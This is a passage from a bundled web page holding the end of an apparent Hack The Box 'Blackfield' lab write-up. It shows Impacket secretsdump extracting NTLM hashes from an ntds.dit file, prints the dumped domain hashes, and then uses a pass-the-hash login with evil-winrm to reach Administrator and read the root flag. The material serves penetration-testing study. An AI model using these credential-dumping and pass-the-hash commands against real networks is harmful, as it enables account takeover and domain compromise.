",(0,r.kt)("inlineCode",{parentName:"p"},"secretsdump")," from Impacket to extract the hashes."),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"$ secretsdump.py -ntds ntds.dit -system system.hive LOCAL\nImpacket v0.9.21 - Copyright 2020 SecureAuth Corporation\n\n[*] Target system bootKey: 0x73d83e56de8961ca9f243e1a49638393\n[*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash)\n[*] Searching for pekList, be patient\n[*] PEK # 0 found and decrypted: 35640a3fd5111b93cc50e3b4e255ff8c\n[*] Reading and decrypting hashes from ntds.dit\nAdministrator:500:aad3b435b51404eeaad3b435b51404ee:184fb5e5178480be64824d4cd53b99ee:::\nGuest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\nDC01$:1000:aad3b435b51404eeaad3b435b51404ee:65557f7ad03ac340a7eb12b9462f80d6:::\nkrbtgt:502:aad3b435b51404eeaad3b435b51404ee:d3c02561bba6ee4ad6cfd024ec8fda5d:::\naudit2020:1103:aad3b435b51404eeaad3b435b51404ee:c95ac94a048e7c29ac4b4320d7c9d3b5:::\nsupport:1104:aad3b435b51404eeaad3b435b51404ee:cead107bf11ebc28b3e6e90cde6de212:::\nBLACKFIELD.local\\BLACKFIELD764430:1105:aad3b435b51404eeaad3b435b51404ee:a658dd0c98e7ac3f46cca81ed6762d1c:::\nBLACKFIELD.local\\BLACKFIELD538365:1106:aad3b435b51404eeaad3b435b51404ee:a658dd0c98e7ac3f46cca81ed6762d1c:::\nBLACKFIELD.local\\BLACKFIELD189208:1107:aad3b435b51404eeaad3b435b51404ee:a658dd0c98e7ac3f46cca81ed6762d1c:::\nBLACKFIELD.local\\BLACKFIELD404458:1108:aad3b435b51404eeaad3b435b51404ee:a658dd0c98e7ac3f46cca81ed6762d1c:::\nBLACKFIELD.local\\BLACKFIELD706381:1109:aad3b435b51404eeaad3b435b51404ee:a658dd0c98e7ac3f46cca81ed6762d1c:::\n...\n")),(0,r.kt)("p",null,"Again a PtH using ",(0,r.kt)("a",{parentName:"p",href:"https://github.com/Hackplayers/evil-winrm"},"evil-winrm")," with Administrator account."),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"$ evil-winrm -u Administrator -H 184fb5e5178480be64824d4cd53b99ee -i 10.10.10.192\n\nEvil-WinRM shell v2.3\n\nInfo: Establishing connection to remote endpoint\n\n*Evil-WinRM* PS C:\\Users\\Administrator\\Documents> gc ../Desktop/root.txt\n511fa0e63117cc3e746a523d0b5fd0b8\n")))}u.isMDXComponent=!0},71062:(e,n,t)=>{t.d(n,{Z:()=>a});const a=t.p+"assets/images/blackfield-4d78c63dab996c8933bd5d19b1a5fbff.png"}}]);